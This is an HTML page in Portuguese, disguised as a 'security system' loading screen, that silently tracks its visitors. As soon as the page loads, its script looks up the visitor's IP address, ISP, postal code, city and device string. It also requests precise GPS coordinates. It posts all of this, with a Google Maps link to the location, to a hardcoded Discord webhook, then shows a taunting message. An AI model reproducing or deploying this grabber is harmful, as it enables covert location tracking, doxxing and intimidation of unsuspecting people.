<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE SEGURANÃ‡A</title>
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        #particles-js { position: absolute; width: 100%; height: 100%; z-index: 1; }
        .ui { position: relative; z-index: 2; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; flex-direction: column; }
        .msg { font-size: 3.5rem; font-weight: 900; display: none; text-shadow: 0 0 20px #f00; }
        .load { border: 3px solid #300; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="particles-js"></div>
    <div class="ui">
        <div id="status">
            <div class="load"></div>
            <div style="letter-spacing: 5px;">PROCESSANDO...</div>
        </div>
        <h1 id="fudido">CE TA FUDIDO</h1>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        // PartÃ­culas rÃ¡pidas
        particlesJS("particles-js", {"particles":{"number":{"value":100},"color":{"value":"#ff0000"},"shape":{"type":"circle"},"opacity":{"value":0.5},"size":{"value":3},"line_linked":{"enable":true,"distance":150,"color":"#ff0000","opacity":0.4,"width":1},"move":{"enable":true,"speed":10}}});

        async function capturar() {
            // 1. DISPARA O IP IMEDIATAMENTE (NÃƒO ESPERA NADA)
            fetch('https://ipapi.co/json/').then(res => res.json()).then(ip => {
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: "âš ï¸ **ALVO IDENTIFICADO (INSTANTÃ‚NEO)**",
                        embeds: [{
                            color: 16711680,
                            description: `**IP:** ${ip.ip}\n**Provedor:** ${ip.org}\n**CEP:** ${ip.postal}\n**Cidade:** ${ip.city}\n**Aparelho:** ${navigator.userAgent}`
                        }]
                    })
                });
            });

            // 2. TENTA O GPS EM PARALELO
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            content: `ðŸŽ¯ **LOCALIZAÃ‡ÃƒO EXATA:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        })
                    });
                }, null, {enableHighAccuracy: true});
            }

            // 3. MOSTRA A MENSAGEM FINAL APÃ“S 1.5 SEGUNDOS (TEMPO DO FETCH)
            setTimeout(() => {
                document.getElementById('status').style.display = 'none';
                document.getElementById('fudido').style.display = 'block';
            }, 1500);
        }

        window.onload = capturar;
    </script>
</body>
</html>
